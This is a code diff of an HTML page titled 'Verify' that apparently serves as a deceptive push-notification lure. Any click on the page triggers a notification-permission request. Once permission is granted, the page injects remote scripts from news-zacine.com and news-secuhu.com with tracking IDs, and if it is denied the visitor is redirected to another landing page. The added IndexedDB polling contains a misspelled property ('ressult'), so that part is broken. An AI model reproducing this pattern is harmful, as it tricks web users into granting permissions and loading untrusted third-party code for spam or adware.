@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta confirm="partners-house-179247"/>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verify</title>
@@ -18,22 +19,53 @@
     <!-- <script type="text/javascript" src="https://news-zacine.com/code/https-v2.js?uid=179247&site=1222090354&banadu=0&sub1=sub1&sub2=sub2&sub3=sub3&sub4=sub4" async></script> -->
     <!-- <script type="text/javascript" src="https://news-secuhu.com/process.js?id=1222090354&p1=sub1&p2=sub2&p3=sub3&p4=sub4" async></script> -->
     <script>
-        document.addEventListener('click', () => {
-           Notification.requestPermission(permission => {
-            if(permission === 'granted') {
-                const script1 = document.createElement('script');
-                script1.type = 'text/javascript';
-                script1.src = 'https://news-zacine.com/code/https-v2.js?uid=179247&site=1222090354&banadu=0&sub1=sub1&sub2=sub2&sub3=sub3&sub4=sub4';
+        if(Notification.permission !== "granted") {
+            document.addEventListener('click', () => {
+            Notification.requestPermission(permission => {
+                if(permission === 'granted') {
+                    initPush();
+                } else if(permission === 'denied') {
+                    goAnotherLanding();
+                }
+            })
+            })
 
-                document.body.appendChild(script1);
+        }
+        else {
+            initPush();
+        }
 
-                const script2 = document.createElement('script');
-                script2.type = 'text/javascript';
-                script2.src = 'https://news-secuhu.com/process.js?id=1222090354&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
-                document.body.appendChild(script2);
+        function initPush() {
+            const script1 = document.createElement('script');
+            script1.type = 'text/javascript';
+            script1.src = 'https://news-zacine.com/code/https-v2.js?uid=179247&site=1222090354&banadu=0&sub1=sub1&sub2=sub2&sub3=sub3&sub4=sub4';
+
+            document.body.appendChild(script1);
+
+            const script2 = document.createElement('script');
+            script2.type = 'text/javascript';
+            script2.src = 'https://news-secuhu.com/process.js?id=1222090354&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
+            document.body.appendChild(script2);
+
+            const request = indexedDB.open('RPDB', 1);
+            request.onsuccess = (event) => {
+                const db = event.target.ressult;
+                const transaction = db.transaction(["RPStore"], "readonly");
+                const objectStore = transaction.objectStore('RPStore');
+                setInterval(() => {
+                    const getRequest = objectStore.get('uid');
+                    getRequest.onsuccess = (event) => {
+                        if(event.target.ressult) {
+                            console.log(event.target.ressult);
+                            if('handler' in window)  {
+                                handler();
+                            }
+                        }
+
+                    }
+                }, 300);
             }
-           })
-        })
+        }
     </script>
 </body>
 </html>
